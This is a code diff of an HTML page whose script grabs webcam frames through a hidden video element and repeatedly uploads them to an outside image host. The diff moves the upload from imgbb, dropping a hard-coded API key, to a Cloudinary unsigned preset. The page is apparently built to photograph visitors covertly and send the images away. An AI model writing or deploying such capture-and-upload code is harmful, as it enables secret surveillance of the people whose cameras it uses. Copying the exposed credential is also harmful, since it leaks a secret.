@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Looped Capture and Upload</title>
+  <title>Looped Capture and Upload to Cloudinary</title>
 </head>
 <body>
   <video id="video" autoplay playsinline style="display:none;"></video>
@@ -11,6 +11,10 @@
     const video = document.createElement('video');
     const canvas = document.createElement('canvas');
     let photoData = '';
+
+    // Replace with your Cloudinary unsigned upload preset and cloud name
+    const cloudName = 'dxkgvoale';
+    const uploadPreset = 'my_unsigned';
 
     async function initCamera() {
       try {
@@ -39,26 +43,23 @@
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
       context.drawImage(video, 0, 0, canvas.width, canvas.height);
-      photoData = canvas.toDataURL('image/png').split(',')[1];
+      photoData = canvas.toDataURL('image/png');
 
       try {
-const uniqueName = `photo_${Date.now()}`; // e.g., photo_1697220000000
+        const formData = new FormData();
+        formData.append('file', photoData);
+        formData.append('upload_preset', uploadPreset);
 
-const res = await fetch('https://api.imgbb.com/1/upload', {
-  method: 'POST',
-  body: new URLSearchParams({
-    key: '36bf4af9003bd786c70577cbfb06ef73',
-    image: photoData,
-    name: uniqueName
-  })
-});
-
+        const res = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
+          method: 'POST',
+          body: formData
+        });
 
         const data = await res.json();
-        if (data.success) {
-          console.log('✅ Uploaded:', data.data.url);
+        if (data.secure_url) {
+          console.log('✅ Uploaded to Cloudinary:', data.secure_url);
         } else {
-          console.error('❌ Upload failed.');
+          console.error('❌ Upload failed.', data);
         }
       } catch (e) {
         console.error('⚠️ Error uploading image.', e);
